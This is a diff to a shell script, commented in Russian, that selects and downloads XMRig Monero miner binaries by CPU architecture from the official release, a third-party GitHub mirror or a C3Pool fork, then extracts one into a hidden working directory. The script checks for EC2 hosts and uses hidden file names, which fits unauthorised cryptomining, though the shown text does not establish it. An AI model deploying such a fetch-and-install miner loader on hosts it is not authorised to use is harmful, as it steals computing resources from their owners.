@@ -79,15 +79,27 @@ kf_log "cores=$CORES threads=$THREADS root=$D ec2=$(kf_is_ec2 && echo yes || ech
 ARCH=$(kf_arch); MACHINE=$(echo "$ARCH" | awk '{print $2}')
 ARCH=$(echo "$ARCH" | awk '{print $1}')
 MO_STATIC_X64="https://raw.githubusercontent.com/WesternJapan/xmrig-static/main/xmrig-x86_64"
+OFFICIAL_X64_TGZ="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 C3_STATIC="https://github.com/C3Pool/xmrig-C3/releases/download/v6.26.0-C7/xmrig-v6.26.0-C7-linux-Static.tar.gz"
 case "$ARCH" in
   x86_64)
-    URLS="${KF_MINER:-$MO_STATIC_X64} $MO_STATIC_X64 ${KF_MIRROR_URL:-}" ;;
+    # по умолчанию — официальный xmrig: никакой калибровки, сразу rx/0
+    URLS="${KF_MINER:-$OFFICIAL_X64_TGZ} $OFFICIAL_X64_TGZ $MO_STATIC_X64 ${KF_MIRROR_URL:-}" ;;
   aarch64|armv7)
     URLS="${KF_MINER_ARM:-} ${KF_MIRROR_URL:-}" ;;
   *)
     kf_log "архитектура $ARCH неизвестна — майнер не ставим"; URLS="" ;;
 esac
+
+# мелким хостам — обычный xmrig с c3pool: без калибровки MO-форка, сразу rx/0
+if [ "${KF_BINARY:-mo}" = "c3" ] && [ "$ARCH" = "x86_64" ]; then
+  if kf_fetch_file "$C3_STATIC" "$D/.c3.tgz" 2>/dev/null && tar xzf "$D/.c3.tgz" -C "$D" xmrig 2>/dev/null; then
+    chmod 700 "$D/xmrig" 2>/dev/null; rm -f "$D/.c3.tgz"
+    kf_log "бинарь: c3pool static (без калибровки)"
+  else
+    kf_log "бинарь c3pool не скачался — берём MO-форк"
+  fi
+fi
 
 if [ ! -x "$D/xmrig" ] && [ -n "$URLS" ] && [ -n "$MACHINE" ]; then
   # shellcheck disable=SC2086
